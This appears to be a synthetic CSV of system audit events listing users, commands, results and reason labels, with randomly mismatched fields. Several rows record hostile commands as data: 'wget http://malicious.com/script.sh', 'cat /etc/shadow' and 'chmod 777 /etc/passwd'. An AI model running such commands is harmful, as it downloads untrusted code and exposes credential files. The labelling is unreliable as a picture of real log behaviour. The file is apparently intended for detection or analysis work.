timestamp,user_id,event_type,resource,action,command,result,ip_address,session_id,reason
2025-05-02T05:40:17Z,U4891,exec,/bin/sudo,run,touch /tmp/testfile,success,10.0.0.102,59929,Normal command execution
2025-05-05T17:45:17Z,U3707,exec,/bin/sudo,run,ls -al /etc,success,10.0.0.175,80894,Routine system scan
2025-05-02T20:11:17Z,U1996,file_access,/etc/passwd,write,,failure,10.0.0.48,22657,Execution blocked by policy
2025-04-30T18:18:17Z,U2124,file_access,/etc/passwd,write,,success,10.0.0.51,60820,Normal command execution
2025-04-30T09:17:17Z,U7036,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.79,93455,Routine system scan
2025-05-06T12:11:17Z,U1885,file_access,/etc/passwd,write,,success,10.0.0.232,65337,Privileged command executed
2025-04-30T14:10:17Z,U7932,file_access,/etc/shadow,write,,success,10.0.0.145,53849,Routine system scan
2025-05-06T06:08:17Z,U9120,exec,/usr/bin/wget,run,touch /tmp/testfile,failure,10.0.0.61,45329,Invalid argument
2025-05-06T17:45:17Z,U5539,file_access,/etc/shadow,write,,failure,10.0.0.123,84884,Segmentation fault
2025-05-06T14:17:17Z,U1498,exec,/usr/bin/wget,run,sudo su,success,10.0.0.166,89094,Administrative task
2025-05-05T17:00:17Z,U7442,file_access,/etc/passwd,read,,success,10.0.0.93,60174,Privileged command executed
2025-04-30T09:42:17Z,U3590,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.126,66932,Routine system scan
2025-05-05T10:06:17Z,U5483,file_access,/etc/shadow,write,,failure,10.0.0.94,59532,Execution blocked by policy
2025-05-06T10:26:17Z,U9282,exec,/bin/sudo,run,cat /etc/shadow,success,10.0.0.172,27892,Normal command execution
2025-05-03T21:28:17Z,U4041,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.90,22428,Access to sensitive file
2025-05-04T10:06:17Z,U1773,exec,/usr/bin/wget,run,wget http://malicious.com/script.sh,success,10.0.0.126,84442,Access to sensitive file
2025-05-05T01:45:17Z,U6763,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.102,69464,Routine system scan
2025-05-05T07:31:17Z,U2706,file_access,/etc/shadow,write,,success,10.0.0.150,68082,Privileged command executed
2025-05-02T02:21:17Z,U9631,file_access,/etc/shadow,read,,success,10.0.0.53,23891,Privileged command executed
2025-05-06T08:07:17Z,U1802,exec,/bin/sudo,run,ls -al /etc,success,10.0.0.221,83790,Routine system scan
2025-05-04T23:16:17Z,U6689,exec,/bin/sudo,run,cat /etc/shadow,success,10.0.0.80,44299,Routine system scan
2025-05-04T08:41:17Z,U5635,exec,/bin/sudo,run,sudo su,success,10.0.0.5,22926,Administrative task
2025-05-03T01:30:17Z,U7841,file_access,/etc/shadow,read,,success,10.0.0.100,35641,Normal command execution
2025-05-03T13:16:17Z,U2582,file_access,/etc/passwd,read,,success,10.0.0.23,23395,Administrative task
2025-05-07T03:48:17Z,U4191,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.78,89391,Execution blocked by policy
2025-05-03T13:02:17Z,U7761,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.168,21097,Routine system scan
2025-05-06T17:20:17Z,U3248,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.178,85580,Administrative task
2025-05-01T19:50:17Z,U9460,file_access,/etc/passwd,write,,success,10.0.0.66,57735,Normal command execution
2025-05-03T23:03:17Z,U7191,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.79,78999,Privileged command executed
2025-05-01T10:11:17Z,U8465,exec,/usr/bin/wget,run,sudo su,success,10.0.0.183,19120,Routine system scan
2025-05-04T11:03:17Z,U4469,file_access,/etc/passwd,read,,success,10.0.0.35,59125,Administrative task
2025-05-05T12:37:17Z,U3474,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.207,61210,Routine system scan
2025-05-02T23:35:17Z,U9009,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.131,64676,Administrative task
2025-05-02T03:42:17Z,U6217,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.78,91523,Access to sensitive file
2025-05-04T23:13:17Z,U9947,file_access,/etc/passwd,write,,success,10.0.0.145,50133,Privileged command executed
2025-05-01T12:28:17Z,U2176,exec,/bin/sudo,run,sudo su,failure,10.0.0.76,18192,Execution blocked by policy
2025-04-30T16:01:17Z,U3769,exec,/bin/bash,run,ls -al /etc,success,10.0.0.130,18204,Administrative task
2025-05-04T08:37:17Z,U3144,exec,/usr/bin/wget,run,wget http://malicious.com/script.sh,failure,10.0.0.158,60418,Segmentation fault
2025-05-04T12:14:17Z,U1931,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.181,57985,Routine system scan
2025-05-07T02:17:17Z,U6594,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.149,47617,Command not found
2025-05-02T11:16:17Z,U2460,exec,/usr/bin/top,run,chmod 777 /etc/passwd,success,10.0.0.106,21863,Routine system scan
2025-05-04T09:54:17Z,U1756,exec,/bin/bash,run,wget http://malicious.com/script.sh,success,10.0.0.70,17951,Privileged command executed
2025-05-07T00:15:17Z,U6910,file_access,/etc/shadow,read,,failure,10.0.0.209,56182,Permission denied
2025-05-01T18:53:17Z,U5021,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.137,46742,Privileged command executed
2025-05-03T12:53:17Z,U1608,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.81,76349,Access to sensitive file
2025-05-04T11:46:17Z,U5022,file_access,/etc/passwd,read,,success,10.0.0.114,42707,Privileged command executed
2025-05-01T04:49:17Z,U4982,file_access,/etc/shadow,write,,success,10.0.0.55,62795,Privileged command executed
2025-05-02T07:11:17Z,U2168,exec,/bin/sudo,run,ls -al /etc,success,10.0.0.61,83081,Privileged command executed
2025-05-05T06:37:17Z,U1432,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.129,18602,Privileged command executed
2025-05-01T19:03:17Z,U7616,file_access,/etc/shadow,read,,success,10.0.0.36,84705,Access to sensitive file
2025-05-04T12:06:17Z,U6955,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.111,38325,Routine system scan
2025-05-03T01:48:17Z,U3248,exec,/usr/bin/top,run,chmod 777 /etc/passwd,success,10.0.0.56,93803,Routine system scan
2025-05-03T11:41:17Z,U2834,exec,/bin/bash,run,chmod 777 /etc/passwd,success,10.0.0.198,39980,Administrative task
2025-05-04T04:12:17Z,U6386,exec,/usr/bin/wget,run,cat /etc/shadow,success,10.0.0.172,46575,Access to sensitive file
2025-05-05T12:52:17Z,U9305,file_access,/etc/passwd,read,,success,10.0.0.163,46489,Access to sensitive file
2025-05-01T01:07:17Z,U1268,exec,/usr/bin/wget,run,ls -al /etc,success,10.0.0.58,22790,Routine system scan
2025-04-30T08:08:17Z,U4207,file_access,/etc/shadow,read,,failure,10.0.0.146,45118,Permission denied
2025-05-01T13:07:17Z,U8925,exec,/bin/bash,run,chmod 777 /etc/passwd,success,10.0.0.93,65502,Administrative task
2025-05-01T10:14:17Z,U1232,file_access,/etc/shadow,write,,success,10.0.0.196,34906,Privileged command executed
2025-04-30T07:40:17Z,U4867,exec,/usr/bin/wget,run,ls -al /etc,success,10.0.0.160,86595,Administrative task
2025-05-01T16:54:17Z,U7904,file_access,/etc/passwd,read,,success,10.0.0.97,25131,Normal command execution
2025-05-03T07:57:17Z,U3092,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.128,39573,Privileged command executed
2025-05-05T11:18:17Z,U5781,exec,/bin/sudo,run,cat /etc/shadow,failure,10.0.0.50,67166,Command not found
2025-05-06T17:55:17Z,U8450,file_access,/etc/passwd,write,,failure,10.0.0.30,28638,Segmentation fault
2025-05-01T21:57:17Z,U4151,exec,/usr/bin/top,run,touch /tmp/testfile,success,10.0.0.12,25186,Administrative task
2025-05-06T15:10:17Z,U6281,file_access,/etc/shadow,read,,failure,10.0.0.217,96823,Segmentation fault
2025-05-02T11:08:17Z,U6637,exec,/usr/bin/wget,run,cat /etc/shadow,success,10.0.0.231,52131,Access to sensitive file
2025-05-06T15:36:17Z,U3898,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.218,71091,Privileged command executed
2025-05-05T19:39:17Z,U3359,file_access,/etc/passwd,read,,success,10.0.0.250,48069,Access to sensitive file
2025-05-03T14:22:17Z,U8768,file_access,/etc/shadow,read,,success,10.0.0.76,70403,Access to sensitive file
2025-05-06T20:03:17Z,U1762,file_access,/etc/shadow,read,,success,10.0.0.23,98516,Access to sensitive file
2025-05-01T06:11:17Z,U8945,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.193,62960,Segmentation fault
2025-05-05T03:36:17Z,U2069,exec,/usr/bin/top,run,sudo su,failure,10.0.0.169,48803,Segmentation fault
2025-05-06T18:37:17Z,U1340,exec,/bin/bash,run,sudo su,success,10.0.0.27,56834,Administrative task
2025-05-06T22:32:17Z,U9466,exec,/bin/sudo,run,touch /tmp/testfile,success,10.0.0.171,35931,Routine system scan
2025-05-03T16:29:17Z,U3419,file_access,/etc/shadow,write,,success,10.0.0.168,91132,Administrative task
2025-05-03T12:51:17Z,U6228,exec,/usr/bin/top,run,sudo su,success,10.0.0.88,67699,Normal command execution
2025-05-02T22:53:17Z,U3181,exec,/usr/bin/wget,run,chmod 777 /etc/passwd,success,10.0.0.1,70657,Privileged command executed
2025-05-06T07:04:17Z,U7231,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.167,43533,Command not found
2025-05-02T19:22:17Z,U7793,exec,/bin/bash,run,touch /tmp/testfile,success,10.0.0.52,87253,Routine system scan
2025-05-02T16:55:17Z,U2535,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.169,62364,Normal command execution
2025-05-01T21:30:17Z,U8685,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.140,34628,Access to sensitive file
2025-05-06T05:59:17Z,U1888,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.173,69232,Administrative task
2025-05-05T13:01:17Z,U3857,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.69,90988,Permission denied
2025-05-06T08:10:17Z,U2394,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.200,76355,Normal command execution
2025-05-03T22:05:17Z,U7754,exec,/bin/sudo,run,cat /etc/shadow,failure,10.0.0.205,34969,Permission denied
2025-05-04T08:36:17Z,U7072,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.17,83339,Privileged command executed
2025-05-05T16:07:17Z,U2209,file_access,/etc/passwd,write,,success,10.0.0.211,76625,Access to sensitive file
2025-05-04T03:47:17Z,U1796,file_access,/etc/passwd,write,,success,10.0.0.62,15971,Access to sensitive file
2025-05-03T06:10:17Z,U4954,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.117,33517,Privileged command executed
2025-05-03T08:53:17Z,U2660,exec,/bin/sudo,run,wget http://malicious.com/script.sh,success,10.0.0.254,90688,Administrative task
2025-05-03T15:13:17Z,U3510,exec,/bin/sudo,run,chmod 777 /etc/passwd,success,10.0.0.71,62336,Routine system scan
2025-05-06T18:58:17Z,U9353,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.63,63308,Invalid argument
2025-05-02T15:58:17Z,U9994,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.46,12664,Normal command execution
2025-05-05T04:11:17Z,U4608,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.216,35650,Command not found
2025-05-05T02:53:17Z,U2270,exec,/bin/bash,run,wget http://malicious.com/script.sh,success,10.0.0.71,35931,Privileged command executed
2025-05-04T09:34:17Z,U3022,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.241,26017,Administrative task
2025-05-06T00:09:17Z,U1219,file_access,/etc/passwd,read,,success,10.0.0.224,22735,Access to sensitive file
2025-05-01T21:57:17Z,U2086,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.51,72746,Routine system scan
2025-05-04T08:15:17Z,U3350,file_access,/etc/shadow,write,,success,10.0.0.136,77314,Privileged command executed
2025-05-04T12:47:17Z,U5839,exec,/bin/bash,run,touch /tmp/testfile,success,10.0.0.7,88500,Privileged command executed
2025-05-05T15:43:17Z,U7434,file_access,/etc/shadow,write,,success,10.0.0.179,47158,Normal command execution
2025-05-05T21:21:17Z,U5736,file_access,/etc/shadow,read,,success,10.0.0.98,36417,Routine system scan
2025-05-05T09:29:17Z,U4727,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.200,76276,Access to sensitive file
2025-05-02T07:21:17Z,U5660,file_access,/etc/shadow,write,,success,10.0.0.99,30467,Normal command execution
2025-05-04T02:05:17Z,U9038,exec,/bin/bash,run,ls -al /etc,success,10.0.0.1,79171,Privileged command executed
2025-05-06T05:13:17Z,U7870,file_access,/etc/passwd,read,,failure,10.0.0.136,47414,Execution blocked by policy
2025-05-04T03:40:17Z,U2290,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.117,59114,Routine system scan
2025-05-06T16:44:17Z,U3973,exec,/usr/bin/top,run,sudo su,success,10.0.0.127,46946,Routine system scan
2025-05-02T00:54:17Z,U5354,exec,/bin/sudo,run,ls -al /etc,success,10.0.0.209,39595,Access to sensitive file
2025-05-03T22:42:17Z,U1337,exec,/usr/bin/top,run,cat /etc/shadow,failure,10.0.0.206,51716,Segmentation fault
2025-05-03T09:28:17Z,U4777,exec,/usr/bin/wget,run,sudo su,success,10.0.0.44,47711,Privileged command executed
2025-05-02T03:45:17Z,U3680,file_access,/etc/passwd,read,,failure,10.0.0.137,18701,Permission denied
2025-05-01T17:00:17Z,U3952,file_access,/etc/passwd,read,,success,10.0.0.118,45423,Normal command execution
2025-05-01T11:30:17Z,U9337,exec,/bin/bash,run,wget http://malicious.com/script.sh,failure,10.0.0.203,28154,Segmentation fault
2025-05-02T20:48:17Z,U3634,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.200,79095,Normal command execution
2025-05-06T05:24:17Z,U7649,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.32,14291,Command not found
2025-05-02T06:09:17Z,U1914,file_access,/etc/shadow,read,,success,10.0.0.40,56955,Administrative task
2025-04-30T15:25:17Z,U6941,file_access,/etc/passwd,write,,success,10.0.0.239,10115,Privileged command executed
2025-05-06T04:57:17Z,U8145,exec,/bin/bash,run,cat /etc/shadow,success,10.0.0.192,84103,Routine system scan
2025-05-02T10:30:17Z,U3417,file_access,/etc/passwd,read,,failure,10.0.0.220,26109,Permission denied
2025-05-05T17:05:17Z,U5808,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.126,19628,Segmentation fault
2025-04-30T08:31:17Z,U1543,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.21,29604,Access to sensitive file
2025-05-04T02:55:17Z,U9062,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.132,90715,Normal command execution
2025-05-02T16:11:17Z,U3573,file_access,/etc/passwd,read,,success,10.0.0.190,34491,Normal command execution
2025-05-02T12:25:17Z,U5438,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.67,61032,Administrative task
2025-05-06T00:51:17Z,U8136,exec,/bin/bash,run,sudo su,success,10.0.0.145,98693,Routine system scan
2025-05-02T09:21:17Z,U2545,file_access,/etc/passwd,write,,success,10.0.0.225,71417,Access to sensitive file
2025-05-02T11:39:17Z,U4691,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.3,17008,Privileged command executed
2025-05-03T10:02:17Z,U6025,exec,/usr/bin/wget,run,sudo su,success,10.0.0.254,61883,Privileged command executed
2025-05-02T11:25:17Z,U1055,file_access,/etc/shadow,write,,success,10.0.0.213,91129,Access to sensitive file
2025-05-05T03:31:17Z,U7592,file_access,/etc/shadow,write,,success,10.0.0.97,95912,Administrative task
2025-04-30T08:25:17Z,U9896,exec,/usr/bin/top,run,sudo su,success,10.0.0.89,82317,Administrative task
2025-05-04T23:28:17Z,U9167,exec,/bin/bash,run,wget http://malicious.com/script.sh,success,10.0.0.222,11858,Privileged command executed
2025-05-05T15:01:17Z,U5231,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.254,87725,Access to sensitive file
2025-05-01T10:34:17Z,U4963,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.208,52531,Normal command execution
2025-05-07T00:31:17Z,U5021,exec,/usr/bin/wget,run,chmod 777 /etc/passwd,success,10.0.0.154,53813,Privileged command executed
2025-05-03T08:13:17Z,U8241,exec,/usr/bin/top,run,wget http://malicious.com/script.sh,success,10.0.0.53,26048,Access to sensitive file
2025-05-03T18:12:17Z,U9671,file_access,/etc/shadow,write,,success,10.0.0.183,27825,Access to sensitive file
2025-05-06T00:28:17Z,U4855,exec,/usr/bin/top,run,cat /etc/shadow,success,10.0.0.183,22779,Administrative task
2025-05-07T00:18:17Z,U6701,file_access,/etc/shadow,write,,success,10.0.0.158,95503,Privileged command executed
2025-05-03T00:02:17Z,U1881,exec,/usr/bin/wget,run,touch /tmp/testfile,success,10.0.0.123,63870,Administrative task
2025-05-01T10:41:17Z,U5667,exec,/usr/bin/wget,run,chmod 777 /etc/passwd,failure,10.0.0.208,45052,Command not found
2025-05-05T13:37:17Z,U7803,exec,/bin/bash,run,ls -al /etc,failure,10.0.0.94,15503,Permission denied
2025-05-01T18:24:17Z,U9616,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.202,50580,Administrative task
2025-05-04T03:29:17Z,U4697,exec,/usr/bin/top,run,chmod 777 /etc/passwd,success,10.0.0.178,56225,Access to sensitive file
2025-05-04T06:39:17Z,U4198,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.152,59903,Routine system scan
2025-05-04T00:36:17Z,U3371,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.236,20735,Execution blocked by policy
2025-05-01T23:11:17Z,U4506,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.92,31459,Administrative task
2025-05-02T04:53:17Z,U1451,exec,/usr/bin/wget,run,touch /tmp/testfile,success,10.0.0.130,20029,Normal command execution
2025-05-06T23:36:17Z,U6088,file_access,/etc/shadow,read,,success,10.0.0.222,60032,Access to sensitive file
2025-04-30T21:00:17Z,U4448,exec,/usr/bin/wget,run,ls -al /etc,success,10.0.0.137,23786,Access to sensitive file
2025-05-03T10:05:17Z,U4114,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.252,33181,Access to sensitive file
2025-04-30T13:49:17Z,U1781,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.91,17941,Routine system scan
2025-05-01T12:30:17Z,U6480,file_access,/etc/shadow,read,,success,10.0.0.148,98846,Privileged command executed
2025-05-01T15:28:17Z,U6420,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.179,70551,Routine system scan
2025-05-03T13:25:17Z,U6743,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.175,65703,Privileged command executed
2025-04-30T20:23:17Z,U9612,exec,/usr/bin/top,run,wget http://malicious.com/script.sh,success,10.0.0.28,90769,Administrative task
2025-05-05T00:56:17Z,U6727,file_access,/etc/shadow,write,,success,10.0.0.163,32399,Privileged command executed
2025-05-02T10:14:17Z,U5625,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.152,32016,Segmentation fault
2025-05-06T03:04:17Z,U8575,file_access,/etc/passwd,read,,success,10.0.0.221,16146,Privileged command executed
2025-05-02T08:26:17Z,U2622,exec,/usr/bin/top,run,touch /tmp/testfile,success,10.0.0.62,27973,Administrative task
2025-05-06T02:20:17Z,U2196,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.221,78604,Access to sensitive file
2025-05-05T22:09:17Z,U3419,exec,/usr/bin/top,run,sudo su,success,10.0.0.6,17484,Administrative task
2025-05-06T09:33:17Z,U6665,file_access,/etc/shadow,write,,success,10.0.0.252,54700,Access to sensitive file
2025-05-02T12:47:17Z,U3184,file_access,/etc/shadow,write,,success,10.0.0.25,69032,Access to sensitive file
2025-05-05T20:57:17Z,U2388,exec,/usr/bin/top,run,cat /etc/shadow,success,10.0.0.29,69110,Administrative task
2025-05-05T05:24:17Z,U2964,exec,/bin/bash,run,ls -al /etc,success,10.0.0.225,73858,Privileged command executed
2025-05-02T16:41:17Z,U1246,file_access,/etc/shadow,read,,success,10.0.0.71,56183,Administrative task
2025-05-02T15:34:17Z,U6628,file_access,/etc/passwd,read,,success,10.0.0.218,15909,Access to sensitive file
2025-05-06T00:39:17Z,U1393,file_access,/etc/passwd,read,,success,10.0.0.167,28274,Normal command execution
2025-05-01T03:29:17Z,U3331,exec,/bin/sudo,run,ls -al /etc,success,10.0.0.201,88123,Privileged command executed
2025-05-05T04:25:17Z,U1249,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.254,79501,Privileged command executed
2025-05-03T21:43:17Z,U3123,file_access,/etc/passwd,read,,success,10.0.0.223,96233,Routine system scan
2025-05-05T17:11:17Z,U7533,file_access,/etc/shadow,read,,success,10.0.0.216,37956,Administrative task
2025-05-04T19:00:17Z,U2051,file_access,/etc/passwd,read,,success,10.0.0.147,54976,Normal command execution
2025-05-04T10:59:17Z,U8656,exec,/bin/bash,run,wget http://malicious.com/script.sh,failure,10.0.0.74,81286,Permission denied
2025-05-03T22:09:17Z,U1659,file_access,/etc/passwd,write,,success,10.0.0.89,93455,Access to sensitive file
2025-05-01T18:52:17Z,U6733,exec,/bin/sudo,run,sudo su,success,10.0.0.143,13342,Privileged command executed
2025-05-03T19:34:17Z,U3891,file_access,/etc/passwd,write,,success,10.0.0.168,12791,Administrative task
2025-05-07T03:21:17Z,U6380,exec,/bin/sudo,run,cat /etc/shadow,success,10.0.0.200,82667,Privileged command executed
2025-05-02T14:33:17Z,U6805,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.213,15079,Administrative task
2025-05-04T22:40:17Z,U9501,file_access,/etc/passwd,write,,failure,10.0.0.103,21846,Segmentation fault
2025-05-01T09:02:17Z,U6517,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.169,97267,Access to sensitive file
2025-05-02T04:49:17Z,U5392,exec,/bin/bash,run,touch /tmp/testfile,success,10.0.0.210,24890,Administrative task
2025-05-03T23:55:17Z,U8450,exec,/bin/bash,run,wget http://malicious.com/script.sh,failure,10.0.0.62,17404,Execution blocked by policy
2025-05-02T00:27:17Z,U3096,exec,/usr/bin/top,run,cat /etc/shadow,failure,10.0.0.93,35934,Segmentation fault
2025-05-01T03:51:17Z,U9401,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.232,94845,Normal command execution
2025-04-30T11:51:17Z,U2676,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.246,44549,Access to sensitive file
2025-05-06T03:46:17Z,U5815,exec,/bin/bash,run,chmod 777 /etc/passwd,failure,10.0.0.12,50986,Execution blocked by policy
2025-05-06T18:39:17Z,U9203,exec,/usr/bin/top,run,touch /tmp/testfile,success,10.0.0.203,61250,Administrative task
2025-04-30T22:05:17Z,U8835,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.217,98057,Administrative task
2025-04-30T17:18:17Z,U6881,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.128,72817,Access to sensitive file
2025-05-05T23:01:17Z,U4173,file_access,/etc/shadow,write,,success,10.0.0.239,34954,Routine system scan
